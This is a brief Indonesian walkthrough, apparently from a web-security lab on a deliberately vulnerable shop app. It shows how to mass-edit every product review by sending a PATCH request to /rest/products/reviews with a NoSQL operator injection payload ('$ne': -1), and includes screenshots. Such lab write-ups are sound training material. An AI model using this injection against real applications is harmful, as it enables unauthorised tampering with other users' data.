1. Setelah menemukan endpoint product review pada /rest/products/reviews, berikut request PUT untuk reviewnya
   <img width="1908" height="1102" alt="Screenshot 2025-09-11 002650" src="https://github.com/user-attachments/assets/982b650d-1261-45ec-88b0-4237a94aa03c" />

2. Kemudian untuk update review gunakan PATCH dan set parameternya ke -1 agar review semua product diubah. Pastikan endpoint dan gunakan PATCH
   ```
       {"message":"test","id":{
    "$ne":-1
    }}
   ```
   <img width="1882" height="1015" alt="Screenshot 2025-09-11 004755" src="https://github.com/user-attachments/assets/3818b104-16af-4c8d-953e-86264cd43523" />
